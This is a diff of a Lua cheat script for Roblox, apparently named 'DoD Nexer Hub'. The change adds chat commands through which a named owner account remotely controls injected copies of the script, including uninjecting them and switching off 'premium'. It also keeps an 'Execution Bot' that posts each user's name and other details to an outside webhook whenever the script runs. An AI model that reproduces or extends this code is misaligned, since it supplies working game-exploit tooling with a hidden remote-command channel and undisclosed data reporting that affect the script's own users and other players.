@@ -2111,8 +2111,21 @@ end
 end
 
 	if playerfound and playerfound.Name == LP.Name then
-	Notify("Success!", "Injected CMDS successfuly!", 10, true)
 	console_injected = true
+	end
+    elseif message:match("-! uninject (%a+)") then
+	local target_name = message:match("-! uninject (%a+)")
+
+local playerfound
+for i,v in pairs(game.Players:GetPlayers()) do
+if string.sub(v.Name, 1, #target_name):lower() == target_name:lower() then
+playerfound = v
+break
+end
+end
+
+	if playerfound and playerfound.Name == LP.Name then
+	console_injected = false
 	end
     elseif message:match("-! activate miso") then
 	if console_injected ~= true then return nil end
@@ -2170,6 +2183,21 @@ end
 	Notify("Gift!", "You have been gifted one-time only premium!", 10, true)
 	getgenv().dodnhPremium = true
 	end
+    elseif message:match("-! deactivate premium (%a+)") then
+	if console_injected ~= true then return nil end
+	local target_name = message:match("-! deactivate premium (%a+)")
+
+local playerfound
+for i,v in pairs(game.Players:GetPlayers()) do
+if string.sub(v.Name, 1, #target_name):lower() == target_name:lower() then
+playerfound = v
+break
+end
+end
+
+	if playerfound and playerfound.Name == LP.Name then
+	getgenv().dodnhPremium = false
+	end
     elseif message:match("-! setanim (%a+)") then
 	if console_injected ~= true then return nil end
 local target_anim = message:match("-! setanim (%a+)")
@@ -2187,39 +2215,13 @@ end)
     end)
 end
 for i,v in pairs(game:GetService("Players"):GetPlayers()) do
-if v then
+if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" then
 v.Chatted:Connect(onChatted)
-if v.Name == "Nexer1234_AnotherAlt" then
-local msg_hi = Instance.new("Message")
-msg_hi.Parent = (game:FindService("CoreGui") and game:GetService("CoreGui")) or game:GetService("Workspace")
-msg_hi.Text = "congrats you met owner of this script!!"
-task.wait(4)
-msg_hi.Text = "btw i don't know that you're a exploiter"
-task.wait(2.5)
-msg_hi.Text = "cuz this msg is automatic"
-task.wait(2.5)
-msg_hi.Text = "just say hi or dm me idk"
-task.wait(2.5)
-msg_hi:Destroy()
-end
 end
 end
 game:GetService("Players").PlayerAdded:Connect(function(v)
-if v then
+if v.Name == LP.Name or v.Name == "Nexer1234_AnotherAlt" then
 v.Chatted:Connect(onChatted)
-if v.Name == "Nexer1234_AnotherAlt" then
-local msg_hi = Instance.new("Message")
-msg_hi.Parent = (game:FindService("CoreGui") and game:GetService("CoreGui")) or game:GetService("Workspace")
-msg_hi.Text = "congrats you met owner of this script!!"
-task.wait(4)
-msg_hi.Text = "btw i don't know that you're a exploiter"
-task.wait(2.5)
-msg_hi.Text = "cuz this msg is automatic"
-task.wait(2.5)
-msg_hi.Text = "just say hi or dm me idk"
-task.wait(2.5)
-msg_hi:Destroy()
-end
 end
 end)
 
@@ -2269,7 +2271,7 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub ^-^",
+    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub (っ °Д °;)っ",
     ["embeds"] = {
        {
            ["title"] = "General Info",
@@ -2397,7 +2399,7 @@ if req then
 local data = {
     ["username"] = "Execution Bot",
     ["avatar_url"] = "https://i.imgur.com/a/SbPHgnH",
-    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub ^-^",
+    ["content"] = "@everyone "..LP.Name.." executed DoD Nexer Hub (っ °Д °;)っ",
     ["embeds"] = {
        {
            ["title"] = "General Info",
